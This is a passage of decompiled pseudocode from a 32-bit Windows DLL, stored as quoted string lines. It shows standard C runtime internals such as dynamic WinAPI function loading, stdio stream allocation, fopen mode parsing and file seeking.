    "      lpCriticalSection[i] = 0;",
    "    }",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "unsigned int __cdecl filter_mbtowcs_flags(unsigned int a1, unsigned int a2)",
    "{",
    "  bool v2; // zf",
    "  bool v4; // zf",
    "  int v5; // eax",
    "",
    "  if ( a1 > 0xDEAC )",
    "  {",
    "    if ( a1 <= 0xDEB1 )",
    "    {",
    "      if ( a1 == 57009 || a1 == 57005 || a1 == 57006 )",
    "        return 0;",
    "      v5 = a1 - 57007;",
    "      v4 = a1 == 57007;",
    "      goto LABEL_15;",
    "    }",
    "    if ( a1 == 57010 || a1 == 57011 || a1 == 65000 )",
    "      return 0;",
    "    if ( a1 != 65001 )",
    "      return a2;",
    "  }",
    "  else",
    "  {",
    "    if ( a1 == 57004 )",
    "      return 0;",
    "    if ( a1 <= 0xC433 )",
    "    {",
    "      if ( a1 == 50227 || a1 == 42 || a1 == 50220 || a1 == 50221 || a1 == 50222 )",
    "        return 0;",
    "      v2 = a1 == 50225;",
    "      goto LABEL_10;",
    "    }",
    "    if ( a1 == 50229 )",
    "      return 0;",
    "    if ( a1 != 54936 )",
    "    {",
    "      v5 = a1 - 57002;",
    "      v4 = a1 == 57002;",
    "LABEL_15:",
    "      if ( v4 )",
    "        return 0;",
    "      v2 = v5 == 1;",
    "LABEL_10:",
    "      if ( v2 )",
    "        return 0;",
    "      return a2;",
    "    }",
    "  }",
    "  return a2 & 8;",
    "}",
    "",
    "",
    "int __cdecl __acrt_MultiByteToWideChar(",
    "        UINT CodePage,",
    "        unsigned int a2,",
    "        LPCCH lpMultiByteStr,",
    "        int cbMultiByte,",
    "        LPWSTR lpWideCharStr,",
    "        int cchWideChar)",
    "{",
    "  DWORD v6; // eax",
    "",
    "  v6 = filter_mbtowcs_flags(CodePage, a2);",
    "  return MultiByteToWideChar(CodePage, v6, lpMultiByteStr, cbMultiByte, lpWideCharStr, cchWideChar);",
    "}",
    "",
    "",
    "int sub_10021AE0()",
    "{",
    "  int result; // eax",
    "",
    "  result = dword_10041000;",
    "  if ( dword_10041000 == -1 )",
    "    return 0;",
    "  if ( !dword_10041000 )",
    "    return sub_10021B8B(0, \"AreFileApisANSI\", (int)&unk_10032978, (int)\"AreFileApisANSI\");",
    "  return result;",
    "}",
    "",
    "",
    "int sub_10021B0A()",
    "{",
    "  int result; // eax",
    "",
    "  result = dword_10041004;",
    "  if ( dword_10041004 == -1 )",
    "    return 0;",
    "  if ( !dword_10041004 )",
    "    return sub_10021B8B(1, \"CompareStringEx\", (int)\"\\b\", (int)\"CompareStringEx\");",
    "  return result;",
    "}",
    "",
    "",
    "int sub_10021B35()",
    "{",
    "  int result; // eax",
    "",
    "  result = dword_10041048;",
    "  if ( dword_10041048 == -1 )",
    "    return 0;",
    "  if ( !dword_10041048 )",
    "    return sub_10021B8B(18, \"LCMapStringEx\", (int)&unk_100329BC, (int)\"LCMapStringEx\");",
    "  return result;",
    "}",
    "",
    "",
    "int sub_10021B60()",
    "{",
    "  int result; // eax",
    "",
    "  result = dword_10041050;",
    "  if ( dword_10041050 == -1 )",
    "    return 0;",
    "  if ( !dword_10041050 )",
    "    return sub_10021B8B(20, \"LocaleNameToLCID\", (int)&unk_100329D4, (int)\"LocaleNameToLCID\");",
    "  return result;",
    "}",
    "",
    "",
    "FARPROC __cdecl sub_10021B8B(int a1, LPCSTR lpProcName, _DWORD *a3, _DWORD *a4)",
    "{",
    "  volatile __int32 *v5; // ebx",
    "  HMODULE v6; // esi",
    "  HMODULE library_from_system_directory; // eax",
    "  FARPROC ProcAddress; // esi",
    "  __int32 v9; // eax",
    "  DWORD flOldProtect; // [esp+Ch] [ebp-4h] BYREF",
    "",
    "  while ( 1 )",
    "  {",
    "    if ( a3 == a4 )",
    "    {",
    "      ProcAddress = 0;",
    "      goto LABEL_10;",
    "    }",
    "    v5 = (volatile __int32 *)((char *)&unk_10040598 + 4 * *a3);",
    "    v6 = (HMODULE)*v5;",
    "    if ( !*v5 )",
    "      break;",
    "    if ( v6 != (HMODULE)-1 )",
    "      goto LABEL_17;",
    "LABEL_7:",
    "    ++a3;",
    "  }",
    "  library_from_system_directory = try_load_library_from_system_directory((&off_10032428)[*a3]);",
    "  v6 = library_from_system_directory;",
    "  if ( !library_from_system_directory )",
    "  {",
    "    _InterlockedExchange(v5, -1);",
    "    goto LABEL_7;",
    "  }",
    "  if ( _InterlockedExchange(v5, (__int32)library_from_system_directory) )",
    "    FreeLibrary(library_from_system_directory);",
    "LABEL_17:",
    "  ProcAddress = GetProcAddress(v6, lpProcName);",
    "LABEL_10:",
    "  __acrt_lock(14);",
    "  if ( !VirtualProtect(&dword_10041000, 0x80u, 4u, &flOldProtect) )",
    "    goto LABEL_18;",
    "  v9 = (__int32)ProcAddress;",
    "  if ( !ProcAddress )",
    "    v9 = -1;",
    "  _InterlockedExchange(&dword_10041000 + a1, v9);",
    "  if ( !VirtualProtect(&dword_10041000, 0x80u, 2u, &flOldProtect) )",
    "LABEL_18:",
    "    abort();",
    "  __acrt_unlock(14);",
    "  return ProcAddress;",
    "}",
    "",
    "",
    "HINSTANCE __cdecl try_load_library_from_system_directory(LPCWSTR lpLibFileName)",
    "{",
    "  HINSTANCE result; // eax",
    "",
    "  result = LoadLibraryExW(lpLibFileName, 0, 0x800u);",
    "  if ( !result )",
    "  {",
    "    if ( GetLastError() != 87 || !wcsncmp(lpLibFileName, L\"api-ms-\", 7u) || !wcsncmp(lpLibFileName, L\"ext-ms-\", 7u) )",
    "      return 0;",
    "    else",
    "      return LoadLibraryExW(lpLibFileName, 0, 0);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __stdcall sub_10021CBB(int a1)",
    "{",
    "  FARPROC v1; // esi",
    "",
    "  v1 = (FARPROC)dword_10041068;",
    "  if ( dword_10041068 != -1",
    "    && (dword_10041068",
    "     || (v1 = sub_10021B8B(",
    "                26,",
    "                \"AppPolicyGetProcessTerminationMethod\",",
    "                &dword_100329F0,",
    "                \"AppPolicyGetProcessTerminationMethod\")) != 0) )",
    "  {",
    "    return ((int (__thiscall *)(FARPROC, int, int))v1)(v1, -6, a1);",
    "  }",
    "  else",
    "  {",
    "    return -1073741275;",
    "  }",
    "}",
    "",
    "",
    "int __stdcall __acrt_AreFileApisANSI()",
    "{",
    "  int (__thiscall *v0)(_DWORD); // eax",
    "",
    "  v0 = (int (__thiscall *)(_DWORD))sub_10021AE0();",
    "  if ( v0 )",
    "    return v0(v0);",
    "  else",
    "    return 1;",
    "}",
    "",
    "",
    "int __stdcall sub_10021D29(",
    "        wchar_t *a1,",
    "        DWORD dwCmpFlags,",
    "        PCNZWCH lpString1,",
    "        int cchCount1,",
    "        PCNZWCH lpString2,",
    "        int cchCount2,",
    "        int a7,",
    "        int a8,",
    "        int a9)",
    "{",
    "  int (__thiscall *v9)(_DWORD, wchar_t *, DWORD, PCNZWCH, int, PCNZWCH, int, int, int, int); // eax",
    "  LCID v11; // eax",
    "",
    "  v9 = (int (__thiscall *)(_DWORD, wchar_t *, DWORD, PCNZWCH, int, PCNZWCH, int, int, int, int))sub_10021B0A();",
    "  if ( v9 )",
    "    return v9(v9, a1, dwCmpFlags, lpString1, cchCount1, lpString2, cchCount2, a7, a8, a9);",
    "  v11 = __acrt_LocaleNameToLCID(a1, 0);",
    "  return CompareStringW(v11, dwCmpFlags, lpString1, cchCount1, lpString2, cchCount2);",
    "}",
    "",
    "",
    "DWORD __stdcall sub_10021D86(void (__stdcall *a1)(PVOID lpFlsData))",
    "{",
    "  return FlsAlloc(a1);",
    "}",
    "",
    "",
    "BOOL __stdcall sub_10021D92(DWORD a1)",
    "{",
    "  return FlsFree(a1);",
    "}",
    "",
    "",
    "int sub_10021D9E()",
    "{",
    "  return dword_1004100C();",
    "}",
    "",
    "",
    "PVOID __stdcall sub_10021DAB(DWORD a1)",
    "{",
    "  return FlsGetValue(a1);",
    "}",
    "",
    "",
    "BOOL __stdcall sub_10021DB7(DWORD a1, void *a2)",
    "{",
    "  return FlsSetValue(a1, a2);",
    "}",
    "",
    "",
    "BOOL __stdcall sub_10021DC3(struct _RTL_CRITICAL_SECTION *a1, DWORD a2, DWORD a3)",
    "{",
    "  return InitializeCriticalSectionEx(a1, a2, a3);",
    "}",
    "",
    "",
    "int __stdcall sub_10021DCF(",
    "        wchar_t *a1,",
    "        DWORD dwMapFlags,",
    "        LPCWSTR lpSrcStr,",
    "        int cchSrc,",
    "        LPWSTR lpDestStr,",
    "        int cchDest,",
    "        int a7,",
    "        int a8,",
    "        int a9)",
    "{",
    "  int (__thiscall *v9)(_DWORD, wchar_t *, DWORD, LPCWSTR, int, LPWSTR, int, int, int, int); // eax",
    "  LCID v11; // eax",
    "",
    "  v9 = (int (__thiscall *)(_DWORD, wchar_t *, DWORD, LPCWSTR, int, LPWSTR, int, int, int, int))sub_10021B35();",
    "  if ( v9 )",
    "    return v9(v9, a1, dwMapFlags, lpSrcStr, cchSrc, lpDestStr, cchDest, a7, a8, a9);",
    "  v11 = __acrt_LocaleNameToLCID(a1, 0);",
    "  return LCMapStringW(v11, dwMapFlags, lpSrcStr, cchSrc, lpDestStr, cchDest);",
    "}",
    "",
    "",
    "int __stdcall __acrt_LocaleNameToLCID(wchar_t *a1, int a2)",
    "{",
    "  int (__thiscall *v2)(_DWORD, wchar_t *, int); // eax",
    "",
    "  v2 = (int (__thiscall *)(_DWORD, wchar_t *, int))sub_10021B60();",
    "  if ( v2 )",
    "    return v2(v2, a1, a2);",
    "  else",
    "    return __acrt_DownlevelLocaleNameToLCID(a1);",
    "}",
    "",
    "",
    "bool __thiscall sub_10021E5D(void *this)",
    "{",
    "  DWORD flOldProtect; // [esp+0h] [ebp-4h] BYREF",
    "",
    "  flOldProtect = (DWORD)this;",
    "  return VirtualProtect(&dword_10041000, 0x80u, 2u, &flOldProtect);",
    "}",
    "",
    "",
    "bool sub_10021E80()",
    "{",
    "  FARPROC v0; // eax",
    "  bool v1; // zf",
    "",
    "  if ( dword_1004100C == (int (*)(void))-1 )",
    "  {",
    "    v0 = 0;",
    "LABEL_5:",
    "    v1 = v0 == 0;",
    "    return !v1;",
    "  }",
    "  v1 = dword_1004100C == 0;",
    "  if ( !dword_1004100C )",
    "  {",
    "    v0 = sub_10021B8B(3, \"FlsGetValue2\", dword_100329A4, \"FlsGetValue2\");",
    "    goto LABEL_5;",
    "  }",
    "  return !v1;",
    "}",
    "",
    "",
    "int __cdecl __acrt_uninitialize_winapi_thunks(char a1)",
    "{",
    "  return __vcrt_uninitialize_winapi_thunks(a1);",
    "}",
    "",
    "",
    "char __cdecl __vcrt_uninitialize_winapi_thunks(char a1)",
    "{",
    "  HMODULE *v1; // esi",
    "",
    "  if ( !a1 )",
    "  {",
    "    v1 = (HMODULE *)&unk_10040598;",
    "    do",
    "    {",
    "      if ( *v1 )",
    "      {",
    "        if ( *v1 != (HMODULE)-1 )",
    "          FreeLibrary(*v1);",
    "        *v1 = 0;",
    "      }",
    "      ++v1;",
    "    }",
    "    while ( v1 != (HMODULE *)&unk_100405F4 );",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "int __cdecl _wmkdir(const wchar_t *Path)",
    "{",
    "  DWORD LastError; // eax",
    "",
    "  if ( CreateDirectoryW(Path, 0) )",
    "    return 0;",
    "  LastError = GetLastError();",
    "  __acrt_errno_map_os_error(LastError);",
    "  return -1;",
    "}",
    "",
    "",
    "_DWORD *__cdecl __acrt_stdio_allocate_stream(_DWORD *a1)",
    "{",
    "  _DWORD *v1; // eax",
    "  _BYTE v3[4]; // [esp+10h] [ebp-1Ch] BYREF",
    "  CPPEH_RECORD ms_exc; // [esp+14h] [ebp-18h]",
    "",
    "  *a1 = 0;",
    "  __acrt_lock(8);",
    "  ms_exc.registration.TryLevel = 0;",
    "  v1 = *(_DWORD **)find_or_allocate_unused_stream_nolock(v3);",
    "  *a1 = v1;",
    "  if ( v1 )",
    "  {",
    "    v1[2] = 0;",
    "    v1[7] = 0;",
    "    *v1 = 0;",
    "    v1[1] = 0;",
    "    v1[4] = -1;",
    "  }",
    "  ms_exc.registration.TryLevel = -2;",
    "  __acrt_unlock(8);",
    "  return a1;",
    "}",
    "",
    "",
    "int __cdecl __acrt_stdio_free_stream(int a1)",
    "{",
    "  int result; // eax",
    "",
    "  *(_DWORD *)a1 = 0;",
    "  *(_DWORD *)(a1 + 4) = 0;",
    "  *(_DWORD *)(a1 + 8) = 0;",
    "  *(_DWORD *)(a1 + 16) = -1;",
    "  *(_DWORD *)(a1 + 20) = 0;",
    "  *(_DWORD *)(a1 + 24) = 0;",
    "  *(_DWORD *)(a1 + 28) = 0;",
    "  result = a1 + 12;",
    "  _InterlockedExchange((volatile __int32 *)(a1 + 12), 0);",
    "  return result;",
    "}",
    "",
    "",
    "FILE **__cdecl find_or_allocate_unused_stream_nolock(FILE **a1)",
    "{",
    "  FILE **v1; // edi",
    "  FILE **v2; // ebx",
    "  FILE *v3; // esi",
    "  FILE **result; // eax",
    "  FILE **v5; // [esp+Ch] [ebp-4h]",
    "",
    "  v1 = (FILE **)((char *)Block + 12);",
    "  v2 = (FILE **)((char *)Block + 4 * dword_10040214);",
    "  v5 = v2;",
    "  while ( 1 )",
    "  {",
    "    if ( v1 == v2 )",
    "      goto LABEL_8;",
    "    v3 = *v1;",
    "    if ( !*v1 )",
    "      break;",
    "    if ( (v3->_flag & 0x2000) == 0 )",
    "    {",
    "      _lock_file(*v1);",
    "      v2 = v5;",
    "      if ( (_InterlockedOr(&v3->_flag, 0x2000u) & 0x2000) == 0 )",
    "        goto LABEL_9;",
    "      _unlock_file(v3);",
    "    }",
    "    ++v1;",
    "  }",
    "  *v1 = (FILE *)sub_10023CF0(1, 56);",
    "  _free_base(0);",
    "  if ( !*v1 )",
    "  {",
    "LABEL_8:",
    "    result = a1;",
    "    *a1 = 0;",
    "    return result;",
    "  }",
    "  (*v1)->_file = -1;",
    "  sub_10021DC3((struct _RTL_CRITICAL_SECTION *)&(*v1)[1], 0xFA0u, 0);",
    "  v3 = *v1;",
    "  _InterlockedOr(&(*v1)->_flag, 0x2000u);",
    "  _lock_file(v3);",
    "LABEL_9:",
    "  result = a1;",
    "  *a1 = v3;",
    "  return result;",
    "}",
    "",
    "",
    "struct __acrt_stdio_stream_mode *__cdecl sub_10022077(struct __acrt_stdio_stream_mode *a1, _BYTE *a2)",
    "{",
    "  char v3; // al",
    "  char v4; // dl",
    "  const char *v5; // ebx",
    "  char v6; // cl",
    "  char v7; // al",
    "  int v8; // eax",
    "  int v9; // eax",
    "  int v10; // eax",
    "  int v11; // eax",
    "  int v12; // eax",
    "  char v13; // ch",
    "  bool v14; // al",
    "  int v15; // eax",
    "  int v16; // eax",
    "  int v17; // eax",
    "  int v18; // eax",
    "  int v19; // eax",
    "  const char *v20; // edi",
    "  bool v21; // zf",
    "  const char *i; // edi",
    "  int v23; // ebx",
    "  const char *j; // ecx",
    "  bool v26; // [esp+Ch] [ebp-4h] BYREF",
    "  bool v27; // [esp+Dh] [ebp-3h] BYREF",
    "  char v28; // [esp+Eh] [ebp-2h]",
    "  char v29; // [esp+Fh] [ebp-1h]",
    "",
    "  *(_DWORD *)a1 = 0;",
    "  *((_DWORD *)a1 + 1) = 0;",
    "  *((_DWORD *)a1 + 2) = 0;",
    "  *((_DWORD *)a1 + 1) = dword_1004087C;",
    "  while ( 1 )",
    "  {",
    "    v3 = *a2;",
    "    if ( *a2 != 32 )",
    "      break;",
    "    ++a2;",
    "  }",
    "  if ( v3 == 97 )",
    "  {",
    "    *(_DWORD *)a1 = 265;",
    "LABEL_10:",
    "    *((_DWORD *)a1 + 1) = 2;",
    "    goto LABEL_11;",
    "  }",
    "  if ( v3 != 114 )",
    "  {",
    "    if ( v3 != 119 )",
    "      goto LABEL_73;",
    "    *(_DWORD *)a1 = 769;",
    "    goto LABEL_10;",
    "  }",
    "  *((_DWORD *)a1 + 1) = 1;",
    "LABEL_11:",
    "  v4 = 0;",
    "  v27 = 0;",
    "  v5 = a2 + 1;",
    "  v26 = 0;",
    "  v28 = 0;",
    "  v29 = 0;",
    "  v6 = 1;",
    "  while ( 1 )",
    "  {",
    "    v7 = *v5;",
    "    if ( !*v5 )",
    "      break;",
    "    if ( v7 > 83 )",
    "    {",
    "      v15 = v7 - 84;",
    "      if ( v15 )",
    "      {",
    "        v16 = v15 - 14;",
    "        if ( v16 )",
    "        {",
    "          v17 = v16 - 1;",
    "          if ( v17 )",
    "          {",
    "            v18 = v17 - 11;",
    "            if ( v18 )",
    "            {",
    "              v19 = v18 - 6;",
    "              if ( v19 )",
    "              {",
    "                if ( v19 != 4 )",
    "                  goto LABEL_73;",
    "                v14 = __acrt_stdio_parse_mode_x(a1);",
    "              }",
    "              else",
    "              {",
    "                v14 = __acrt_stdio_parse_mode_t(a1);",
    "              }",
    "            }",
    "            else",
    "            {",
    "              v14 = __acrt_stdio_parse_mode_n(a1, &v27);",
    "            }",
    "          }",
    "          else",
    "          {",
    "            v14 = __acrt_stdio_parse_mode_c(a1, &v27);",
    "          }",
    "        }",
    "        else",
    "        {",
    "          v14 = __acrt_stdio_parse_mode_b(a1);",
    "        }",
    "      }",
    "      else",
    "      {",
    "        v14 = __acrt_stdio_parse_mode_T(a1);",
    "      }",
    "      goto LABEL_43;",
    "    }",
    "    if ( v7 == 83 )",
    "    {",
    "      v13 = v29;",
    "      if ( !v4 )",
    "      {",
    "        *(_DWORD *)a1 |= 0x20u;",
    "        goto LABEL_30;",
    "      }",
    "    }",
    "    else",
    "    {",
    "      v8 = v7 - 32;",
    "      if ( !v8 )",
    "        goto LABEL_44;",
    "      v9 = v8 - 11;",
    "      if ( !v9 )",
    "      {",
    "        v14 = __acrt_stdio_parse_mode_plus(a1, &v26);",
    "LABEL_43:",
    "        v4 = v28;",
    "        v6 = v14;",
    "        goto LABEL_44;",
    "      }",
    "      v10 = v9 - 1;",
    "      if ( v10 )",
    "      {",
    "        v11 = v10 - 24;",
    "        if ( !v11 )",
    "        {",
    "          v14 = __acrt_stdio_parse_mode_D(a1);",
    "          goto LABEL_43;",
    "        }",
    "        v12 = v11 - 10;",
    "        if ( !v12 )",
    "        {",
    "          *(_DWORD *)a1 |= 0x80u;",
    "          v6 = 1;",
    "LABEL_44:",
    "          v13 = v29;",
    "          goto LABEL_45;",
    "        }",
    "        if ( v12 != 4 )",
    "          goto LABEL_73;",
    "        v13 = v29;",
    "        if ( !v4 )",
    "        {",
    "          *(_DWORD *)a1 |= 0x10u;",
    "LABEL_30:",
    "          v4 = 1;",
    "          v28 = 1;",
    "          v6 = 1;",
    "          goto LABEL_45;",
    "        }",
    "      }",
    "      else",
    "      {",
    "        v13 = 1;",
    "        v29 = 1;",
    "      }",
    "    }",
    "    v6 = 0;",
    "LABEL_45:",
    "    v5 += v6 != 0;",
    "    if ( !v6 )",
    "      goto LABEL_48;",
    "  }",
    "  v13 = v29;",
    "LABEL_48:",
    "  v20 = v5 + 1;",
    "  if ( !v13 )",
    "    v20 = v5;",
    "  while ( *v20 == 32 )",
    "    ++v20;",
    "  if ( !v13 )",
    "  {",
    "    v21 = *v20 == 0;",
    "    goto LABEL_55;",
    "  }",
    "  if ( strncmp(v20, \"ccs\", 3u) )",
    "    goto LABEL_73;",
    "  for ( i = v20 + 3; *i == 32; ++i )",
    "    ;",
    "  if ( *i != 61 )",
    "    goto LABEL_73;",
    "  do",
    "    ++i;",
    "  while ( *i == 32 );",
    "  v23 = 5;",
    "  if ( !_strnicmp(i, \"UTF-8\", 5u) )",
    "  {",
    "    *(_DWORD *)a1 |= 0x40000u;",
    "    goto LABEL_69;",
    "  }",
    "  v23 = 8;",
    "  if ( !_strnicmp(i, \"UTF-16LEUNICODE\", 8u) )",
    "  {",
    "    *(_DWORD *)a1 |= 0x20000u;",
    "    goto LABEL_69;",
    "  }",
    "  v23 = 7;",
    "  if ( _strnicmp(i, \"UNICODE\", 7u) )",
    "    goto LABEL_73;",
    "  *(_DWORD *)a1 |= 0x10000u;",
    "LABEL_69:",
    "  for ( j = &i[v23]; *j == 32; ++j )",
    "    ;",
    "  v21 = *j == 0;",
    "LABEL_55:",
    "  if ( !v21 )",
    "  {",
    "LABEL_73:",
    "    *(_DWORD *)sub_1001E025() = 22;",
    "    _invalid_parameter_noinfo();",
    "    return a1;",
    "  }",
    "  *((_BYTE *)a1 + 8) = 1;",
    "  return a1;",
    "}",
    "",
    "",
    "int __cdecl sub_100222B8(char *FileName, _BYTE *a2, int ShareFlag, int a4)",
    "{",
    "  int *v4; // eax",
    "  _BYTE v6[12]; // [esp+8h] [ebp-1Ch] BYREF",
    "  int OpenFlag; // [esp+14h] [ebp-10h]",
    "  unsigned int v8; // [esp+18h] [ebp-Ch]",
    "  int v9; // [esp+1Ch] [ebp-8h]",
    "  int FileHandle; // [esp+20h] [ebp-4h] BYREF",
    "",
    "  v4 = (int *)sub_10022077((struct __acrt_stdio_stream_mode *)v6, a2);",
    "  OpenFlag = *v4;",
    "  v8 = v4[1];",
    "  v9 = v4[2];",
    "  if ( !(_BYTE)v9 || _sopen_s(&FileHandle, FileName, OpenFlag, ShareFlag, 384) )",
    "    return 0;",
    "  ++dword_1004021C;",
    "  _InterlockedOr((volatile signed __int32 *)(a4 + 12), v8);",
    "  *(_DWORD *)(a4 + 8) = 0;",
    "  *(_DWORD *)(a4 + 28) = 0;",
    "  *(_DWORD *)(a4 + 4) = 0;",
    "  *(_DWORD *)a4 = 0;",
    "  *(_DWORD *)(a4 + 16) = FileHandle;",
    "  return a4;",
    "}",
    "",
    "",
    "char __cdecl __acrt_stdio_parse_mode_D(struct __acrt_stdio_stream_mode *a1)",
    "{",
    "  if ( (*(_DWORD *)a1 & 0x40) != 0 )",
    "    return 0;",
    "  *(_DWORD *)a1 |= 0x40u;",
    "  return 1;",
    "}",
    "",
    "",
    "char __cdecl __acrt_stdio_parse_mode_T(struct __acrt_stdio_stream_mode *a1)",
    "{",
    "  if ( (*(_DWORD *)a1 & 0x1000) != 0 )",
    "    return 0;",
    "  *(_DWORD *)a1 |= 0x1000u;",
    "  return 1;",
    "}",
    "",
    "",
    "char __cdecl __acrt_stdio_parse_mode_b(struct __acrt_stdio_stream_mode *a1)",
    "{",
    "  if ( (*(_DWORD *)a1 & 0xC000) != 0 )",
    "    return 0;",
    "  *(_DWORD *)a1 |= 0x8000u;",
    "  return 1;",
    "}",
    "",
    "",
    "bool __cdecl __acrt_stdio_parse_mode_c(struct __acrt_stdio_stream_mode *a1, bool *a2)",
    "{",
    "  bool result; // al",
    "",
    "  if ( *a2 )",
    "    return 0;",
    "  *a2 = 1;",
    "  result = 1;",
    "  *((_DWORD *)a1 + 1) |= 0x800u;",
    "  return result;",
    "}",
    "",
    "",
    "bool __cdecl __acrt_stdio_parse_mode_n(struct __acrt_stdio_stream_mode *a1, bool *a2)",
    "{",
    "  bool result; // al",
    "",
    "  if ( *a2 )",
    "    return 0;",
    "  *a2 = 1;",
    "  result = 1;",
    "  *((_DWORD *)a1 + 1) &= ~0x800u;",
    "  return result;",
    "}",
    "",
    "",
    "bool __cdecl __acrt_stdio_parse_mode_plus(struct __acrt_stdio_stream_mode *a1, bool *a2)",
    "{",
    "  bool result; // al",
    "",
    "  if ( *a2 )",
    "    return 0;",
    "  *a2 = 1;",
    "  if ( (*(_DWORD *)a1 & 2) != 0 )",
    "    return 0;",
    "  result = 1;",
    "  *(_DWORD *)a1 = *(_DWORD *)a1 & 0xFFFFFFFC | 2;",
    "  *((_DWORD *)a1 + 1) = *((_DWORD *)a1 + 1) & 0xFFFFFFF8 | 4;",
    "  return result;",
    "}",
    "",
    "",
    "char __cdecl __acrt_stdio_parse_mode_t(struct __acrt_stdio_stream_mode *a1)",
    "{",
    "  if ( (*(_DWORD *)a1 & 0xC000) != 0 )",
    "    return 0;",
    "  *(_DWORD *)a1 |= 0x4000u;",
    "  return 1;",
    "}",
    "",
    "",
    "char __cdecl __acrt_stdio_parse_mode_x(struct __acrt_stdio_stream_mode *a1)",
    "{",
    "  if ( (*(_DWORD *)a1 & 0x200) == 0 )",
    "    return 0;",
    "  *(_DWORD *)a1 |= 0x400u;",
    "  return 1;",
    "}",
    "",
    "",
    "int __cdecl sub_1002244F(char *FileName, _BYTE *a2, int ShareFlag, int a4)",
    "{",
    "  return sub_100222B8(FileName, a2, ShareFlag, a4);",
    "}",
    "",
    "",
    "int __cdecl common_lseek<__int64>(",
    "        int FileHandle,",
    "        LARGE_INTEGER liDistanceToMove,",
    "        DWORD dwMoveMethod,",
    "        __crt_cached_ptd_host *a4)",
    "{",
    "  int v4; // edi",
    "  BOOL v5; // eax",
    "  int v7; // [esp+18h] [ebp-20h]",
    "",
    "  if ( FileHandle == -2 )",
    "  {",
    "    *((_BYTE *)a4 + 36) = 1;",
    "    *((_DWORD *)a4 + 8) = 0;",
    "    *((_BYTE *)a4 + 28) = 1;",
    "    *((_DWORD *)a4 + 6) = 9;",
    "    return -1;",
    "  }",
    "  v5 = FileHandle >= 0 && FileHandle < (unsigned int)dword_10040590;",
    "  if ( !v5",
    "    || (v7 = 56 * (FileHandle & 0x3F), (*((_BYTE *)&lpCriticalSection[FileHandle >> 6][1].LockSemaphore + v7) & 1) == 0) )",
    "  {",
    "    *((_BYTE *)a4 + 36) = 1;",
    "    *((_DWORD *)a4 + 8) = 0;",
    "    *((_BYTE *)a4 + 28) = 1;",
    "    *((_DWORD *)a4 + 6) = 9;",
    "    _invalid_parameter_internal(0, 0, 0, 0, 0, (struct __acrt_ptd **)a4);",
    "    return -1;",
    "  }",
    "  __acrt_lowio_lock_fh(FileHandle);",
    "  v4 = -1;",
    "  if ( (*((_BYTE *)&lpCriticalSection[FileHandle >> 6][1].LockSemaphore + v7) & 1) != 0 )",
    "  {",
    "    v4 = common_lseek_nolock<__int64>(FileHandle, liDistanceToMove, dwMoveMethod, (int)a4);",
    "  }",
    "  else",
    "  {",
    "    *((_BYTE *)a4 + 28) = 1;",
    "    *((_DWORD *)a4 + 6) = 9;",
    "    *((_BYTE *)a4 + 36) = 1;",
    "    *((_DWORD *)a4 + 8) = 0;",
    "  }",
    "  __acrt_lowio_unlock_fh(FileHandle);",
    "  return v4;",
    "}",
    "",
    "",
    "DWORD __cdecl common_lseek_nolock<__int64>(int FileHandle, LARGE_INTEGER liDistanceToMove, DWORD dwMoveMethod, int a4)",
    "{",
    "  void *osfhandle; // eax",
    "  DWORD result; // eax",
    "  DWORD LastError; // eax",
    "  LARGE_INTEGER NewFilePointer; // [esp+8h] [ebp-8h] BYREF",
    "",
    "  osfhandle = (void *)_get_osfhandle(FileHandle);",
    "  if ( osfhandle == (void *)-1 )",
    "  {",
    "    *(_BYTE *)(a4 + 28) = 1;",
    "    *(_DWORD *)(a4 + 24) = 9;",
    "    return -1;",
    "  }",
    "  if ( !SetFilePointerEx(osfhandle, liDistanceToMove, &NewFilePointer, dwMoveMethod) )",
    "  {",
    "    LastError = GetLastError();",
    "    __acrt_errno_map_os_error_ptd(LastError, a4);",
    "    return -1;",
    "  }",
    "  if ( (NewFilePointer.HighPart & NewFilePointer.LowPart) == -1 )",
    "    return -1;",
    "  result = NewFilePointer.LowPart;",
    "  *((_BYTE *)&lpCriticalSection[FileHandle >> 6][1].LockSemaphore + 56 * (FileHandle & 0x3F)) &= ~2u;",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl _lseeki64_internal(",
    "        int FileHandle,",
    "        LARGE_INTEGER liDistanceToMove,",
    "        DWORD dwMoveMethod,",
    "        __crt_cached_ptd_host *a4)",
    "{",
    "  return common_lseek<__int64>(FileHandle, liDistanceToMove, dwMoveMethod, a4);",
    "}",
    "",
    "",
    "DWORD __cdecl _lseeki64_nolock(int FileHandle, LARGE_INTEGER liDistanceToMove, DWORD dwMoveMethod)",
    "{",
    "  DWORD v3; // esi",
    "  int v5[10]; // [esp+8h] [ebp-28h] BYREF",
    "",
    "  __crt_cached_ptd_host::__crt_cached_ptd_host((__crt_cached_ptd_host *)v5, 0);",
    "  v3 = common_lseek_nolock<__int64>(FileHandle, liDistanceToMove, dwMoveMethod, (int)v5);",
    "  __crt_cached_ptd_host::~__crt_cached_ptd_host((__crt_cached_ptd_host *)v5);",
    "  return v3;",
    "}",
    "",
    "",
    "DWORD __cdecl _lseeki64_nolock_internal(int FileHandle, LARGE_INTEGER liDistanceToMove, DWORD dwMoveMethod, int a4)",
    "{",
    "  return common_lseek_nolock<__int64>(FileHandle, liDistanceToMove, dwMoveMethod, a4);",
    "}",
    "",
    "",
    "void __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_2866be3712abc81a800a822484c830d8_,_lambda_39ca0ed439415581b5b15c265174cece_ &,_lambda_2b24c74d71094a6cd0cb82e44167d71b_>(",
    "        FILE **a1,",
    "        FILE ***a2,",
    "        FILE **a3)",
    "{",
    "  _lock_file(*a1);",
    "  if ( (unsigned __int8)common_flush_all_should_try_to_flush_stream(**a2, a2[1])",
    "    && (*(_BYTE *)a2[2] || ((**a2)->_flag & 2) != 0) )",
    "  {",
    "    if ( _fflush_nolock(**a2) == -1 )",
    "      *a2[3] = (FILE *)-1;",
    "    else",
    "      *a2[1] = (FILE *)((char *)*a2[1] + 1);",
    "  }",
    "  _unlock_file(*a3);",
    "}",
    "",
    "",
    "int __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_2cc53f568c5a2bb6f192f930a45d44ea_,_lambda_ab61a845afdef5b7c387490eaf3616ee_ &,_lambda_c2ffc0b7726aa6be21d5f0026187e748_>(",
    "        _DWORD *a1,",
    "        FILE ***a2,",
    "        _DWORD *a3)",
    "{",
    "  FILE **v3; // esi",
    "  FILE **v4; // ebx",
    "  FILE ***v5; // edi",
    "  FILE **v6; // edx",
